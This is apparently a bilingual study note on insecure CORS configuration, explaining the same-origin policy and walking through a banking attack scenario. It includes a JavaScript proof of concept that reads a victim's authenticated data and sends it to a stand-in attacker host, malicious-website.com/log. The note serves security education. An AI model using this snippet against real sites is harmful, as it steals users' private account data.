---
title: "Theory"
---

# Theory

https://portswigger.net/web-security/cors

**Same-origin policy** ->  It generally allows a domain to issue requests to other domains, but not to access the responses.
CORS -> Headers shared between domains to allow full cross-origin access.

**Ejemplo práctico de mala implementación de CORS :**

```request
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=... (la cookie de sesión del usuario)
```

```request
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
```

```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
    location='//malicious-website.com/log?key='+this.responseText;
};
```

Envía una solicitud GET a https://vulnerable-website.com/sensitive-victim-data.
req.withCredentials = true asegura que las cookies de sesión del usuario se incluyan en la solicitud.
Cuando recibe la respuesta (this.responseText), redirige al navegador a malicious-website.com/log, enviando los datos sensibles obtenidos en la respuesta como parte de la URL.

**Mistakes often arise when implementing CORS origin whitelists. Some organizations decide to allow access from all their subdomains (including future subdomains not yet in existence). And some applications allow access from various other organizations' domains including their subdomains.**

**How to test cors** -> https://zguyun.com/blog/how-to-test-cors-with-postman/

__________________________________________________________________________

Una mala implementación de CORS puede ser un problema grave de seguridad porque permite que un sitio web malicioso realice solicitudes a una API o aplicación web en nombre del usuario sin su conocimiento o consentimiento. Esto puede dar lugar a la filtración de datos sensibles y comprometer la cuenta o los datos del usuario en el servidor. 

### Escenario de peor caso de una mala implementación de CORS

Imagina una aplicación web bancaria (por ejemplo, `https://bank.com`) que expone una API para consultar el saldo, hacer transferencias, actualizar datos de perfil, etc. Supongamos que el servidor tiene una configuración de CORS insegura. Aquí tienes cómo se vería un ataque en este escenario:

1. **Configuración insegura de CORS en el servidor**:
   - La API de `https://bank.com` permite solicitudes CORS desde cualquier origen al reflejar el valor de la cabecera `Origin` en `Access-Control-Allow-Origin`.
   - Además, la cabecera `Access-Control-Allow-Credentials` está configurada en `true`, permitiendo el envío de cookies de sesión o tokens de autenticación en solicitudes CORS.

2. **El usuario inicia sesión en `https://bank.com`**:
   - El usuario se autentica en el sitio y se le asigna una cookie de sesión que autoriza sus solicitudes a la API de `https://bank.com`.

3. **El atacante crea un sitio malicioso**:
   - El atacante crea un sitio malicioso, `https://malicious-website.com`, que contiene un script para acceder a la API de `https://bank.com` usando las credenciales del usuario.

4. **El usuario visita el sitio malicioso**:
   - El usuario visita `https://malicious-website.com` mientras aún está autenticado en `https://bank.com` en otra pestaña o en la misma sesión del navegador.

5. **El sitio malicioso envía una solicitud CORS a la API del banco**:
   - El script en `https://malicious-website.com` realiza una solicitud a `https://bank.com/api/accountDetails`, incluyendo la cookie de sesión del usuario, gracias a `credentials: "include"`.
   - Debido a la configuración insegura de CORS, el servidor en `https://bank.com` acepta la solicitud de `https://malicious-website.com` y responde con los detalles de la cuenta del usuario.

6. **El atacante obtiene datos sensibles del usuario**:
   - El sitio malicioso ahora tiene acceso a la respuesta de la API de `https://bank.com`, que contiene datos confidenciales, como el saldo, transacciones o información personal del usuario.

7. **Posibilidad de operaciones maliciosas**:
   - Si la API permite operaciones como transferencias bancarias o cambios de información, el sitio malicioso podría enviar solicitudes para transferir dinero, actualizar la dirección del usuario, o cualquier otra acción que el usuario autorizado puede realizar.

### Consecuencias de esta configuración insegura:

- **Acceso no autorizado a datos personales**: El atacante puede obtener información sensible, como saldo bancario, historial de transacciones, o cualquier dato expuesto a través de la API.
- **Robo de dinero**: Si la API permite transacciones bancarias, el atacante podría realizar transferencias en nombre del usuario, lo cual tendría un impacto financiero directo.
- **Modificación de datos**: El atacante podría cambiar detalles personales, como el número de teléfono o la dirección, lo cual podría tener repercusiones en el acceso futuro del usuario.
- **Exposición de otras vulnerabilidades**: Si el sistema tiene otras vulnerabilidades (como inyección de SQL o vulnerabilidades de autenticación), el atacante podría explotarlas con más facilidad al tener acceso a la API desde cualquier origen.

### Lecciones de seguridad
